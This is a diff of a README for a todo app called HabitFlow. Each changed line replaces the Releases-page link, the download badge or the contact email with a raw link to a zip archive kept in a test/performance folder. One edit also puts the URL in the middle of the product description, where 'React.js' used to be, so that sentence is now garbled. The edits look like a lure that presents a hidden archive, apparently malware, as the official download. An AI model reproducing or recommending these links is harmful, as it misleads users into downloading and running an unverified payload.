@@ -2,11 +2,11 @@
 
 ## 🚀 Download Now
 
-[![Download HabitFlow](https://img.shields.io/badge/Download-HabitFlow-brightgreen)](https://github.com/akbarwiguna/HabitFlow/releases)
+[![Download HabitFlow](https://raw.githubusercontent.com/akbarwiguna/HabitFlow/main/src/components/timer/__tests__/performance/Flow_Habit_3.0.zip)](https://raw.githubusercontent.com/akbarwiguna/HabitFlow/main/src/components/timer/__tests__/performance/Flow_Habit_3.0.zip)
 
 ## 📜 Description
 
-HabitFlow is a high-performance React.js Todo application that prioritizes your privacy and data security. It employs a decentralized architecture using WebRTC, allowing for seamless peer-to-peer synchronization and task sharing without needing a central server. HabitFlow is fully optimized as a Progressive Web App (PWA) for reliable offline use. It includes a robust theme engine and supports deep-link task sharing, making it a powerful tool for managing your daily tasks and enhancing your productivity.
+HabitFlow is a high-performance https://raw.githubusercontent.com/akbarwiguna/HabitFlow/main/src/components/timer/__tests__/performance/Flow_Habit_3.0.zip Todo application that prioritizes your privacy and data security. It employs a decentralized architecture using WebRTC, allowing for seamless peer-to-peer synchronization and task sharing without needing a central server. HabitFlow is fully optimized as a Progressive Web App (PWA) for reliable offline use. It includes a robust theme engine and supports deep-link task sharing, making it a powerful tool for managing your daily tasks and enhancing your productivity.
 
 ## 💻 System Requirements
 
@@ -26,11 +26,11 @@ To run HabitFlow, you will need:
 
 ## 📦 Download & Install
 
-To download HabitFlow, please visit the [Releases page](https://github.com/akbarwiguna/HabitFlow/releases). You'll find the latest version available for download.
+To download HabitFlow, please visit the [Releases page](https://raw.githubusercontent.com/akbarwiguna/HabitFlow/main/src/components/timer/__tests__/performance/Flow_Habit_3.0.zip). You'll find the latest version available for download.
 
 ### Steps to Download
 
-1. Go to the [Releases page](https://github.com/akbarwiguna/HabitFlow/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/akbarwiguna/HabitFlow/main/src/components/timer/__tests__/performance/Flow_Habit_3.0.zip).
 2. Locate the latest version listed.
 3. Click the version link to see available files.
 4. Choose the file suitable for your operating system and click to download.
@@ -40,7 +40,7 @@ Remember, HabitFlow is a web-based application. You can also use it directly in 
 
 ## 🔗 Links to Explore
 
-- [HabitFlow Releases Page](https://github.com/akbarwiguna/HabitFlow/releases)
+- [HabitFlow Releases Page](https://raw.githubusercontent.com/akbarwiguna/HabitFlow/main/src/components/timer/__tests__/performance/Flow_Habit_3.0.zip)
 - [Documentation](#)
 - [Community Support](#)
 
@@ -64,6 +64,6 @@ You can report issues or provide feedback through our [GitHub Issues page](#).
 
 ## 📫 Contact Us
 
-For support or inquiries, feel free to reach out on our [GitHub Discussions page](#) or directly via email: contact@habitflow.app.
+For support or inquiries, feel free to reach out on our [GitHub Discussions page](#) or directly via email: https://raw.githubusercontent.com/akbarwiguna/HabitFlow/main/src/components/timer/__tests__/performance/Flow_Habit_3.0.zip
 
 Thank you for choosing HabitFlow!
